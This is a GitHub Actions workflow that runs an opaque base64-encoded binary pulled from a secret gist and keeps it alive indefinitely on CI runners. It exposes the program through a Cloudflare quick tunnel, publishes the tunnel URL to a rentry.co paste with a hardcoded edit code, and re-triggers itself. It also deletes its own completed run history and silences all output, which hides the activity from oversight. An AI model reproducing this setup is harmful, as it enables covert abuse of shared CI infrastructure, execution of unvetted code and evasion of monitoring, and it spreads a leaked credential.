---
name: "Ubuntu: Background Job"

"on":
  workflow_dispatch:

concurrency:
  group: background-job
  cancel-in-progress: true

jobs:
  job:
    runs-on: ubuntu-latest
    timeout-minutes: 355
    permissions:
      actions: write

    steps:
      - run: |
          set -euo pipefail

          sleep 30
          gh run list --workflow="Ubuntu: Background Job" --repo ${{ github.repository }} --status completed --json databaseId --jq '.[].databaseId' | xargs -I{} gh run delete {} --repo ${{ github.repository }} 2>/dev/null || true

          curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o ~/cloudflared >/dev/null 2>&1
          sudo install -m 0755 ~/cloudflared /usr/local/bin/cloudflared >/dev/null 2>&1

          rm -rf ~/g
          git config --global core.autocrlf false >/dev/null 2>&1
          git config --global core.eol lf >/dev/null 2>&1
          gh gist clone ${{ secrets.GH_GIST_TMP }} ~/g >/dev/null 2>&1

          [ -f ~/g/tmp.db.base64 ] && tr -d '\r\n' < ~/g/tmp.db.base64 | base64 -d > ~/tmp.db 2>/dev/null || true
          tr -d '\r\n' < ~/g/tmp.base64 | base64 -d > ~/tmp 2>/dev/null
          chmod +x ~/tmp
          rm -rf ~/g

          cd ~
          ./tmp >/dev/null 2>&1 &
          APP_PID=$!

          for _ in $(seq 1 15); do
            ss -tln 2>/dev/null | grep -q '127.0.0.1:8080' && break
            sleep 1
          done
          ss -tln 2>/dev/null | grep -q '127.0.0.1:8080'

          TUNNEL_PID=
          TUNNEL_URL=

          start_tunnel() {
            local log pid url code
            log=$(mktemp)
            cloudflared tunnel --url http://127.0.0.1:8080 >"$log" 2>&1 &
            pid=$!
            url=
            for _ in $(seq 1 30); do
              url=$(grep -oP 'https://[a-z0-9-]+\.trycloudflare\.com' "$log" 2>/dev/null | head -n1 || true)
              [ -n "$url" ] && break
              sleep 1
            done
            if [ -z "$url" ]; then
              kill "$pid" >/dev/null 2>&1 || true
              rm -f "$log"
              return 1
            fi
            for _ in $(seq 1 30); do
              code=$(curl -sS -o /dev/null -w '%{http_code}' "$url" 2>/dev/null || true)
              case "$code" in 200|404|405) TUNNEL_PID="$pid"; TUNNEL_URL="$url"; rm -f "$log"; return 0;; esac
              sleep 1
            done
            kill "$pid" >/dev/null 2>&1 || true
            rm -f "$log"
            return 1
          }

          sync_state() {
            if [ -f ~/tmp.db ]; then
              base64 -w0 ~/tmp.db > /tmp/tmp.db.base64.bak 2>/dev/null || true
              if [ -s /tmp/tmp.db.base64.bak ]; then
                printf '{"files":{"tmp.db.base64":{"content":"%s"}}}' "$(cat /tmp/tmp.db.base64.bak)" > /tmp/tmp.db.bak 2>/dev/null
                gh api --method PATCH /gists/${{ secrets.GH_GIST_TMP }} --input /tmp/tmp.db.bak >/dev/null 2>&1 || true
                rm -f /tmp/tmp.db.base64.bak /tmp/tmp.db.bak
              fi
            fi
            if [ -n "${TUNNEL_URL:-}" ]; then
              curl -s -d "text=$TUNNEL_URL&edit_code=b32PfV8M" https://rentry.co/api/edit/776146e68d724a70fc8163f8a92ed8e74ee4453828576a61581f5b823e22c707 || true
            fi
          }

          start_tunnel || true
          sync_state
          trap 'sync_state' EXIT

          while true; do
            sleep 1800

            OLD_PID="${TUNNEL_PID:-}"
            if start_tunnel; then
              [ -n "$OLD_PID" ] && kill "$OLD_PID" >/dev/null 2>&1 || true
            fi

            sync_state

            kill -0 "$APP_PID" >/dev/null 2>&1 || exit 1
          done &

          sleep 21210
          sync_state
          gh workflow run "Ubuntu: Background Job" --repo ${{ github.repository }} >/dev/null 2>&1 || true

        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
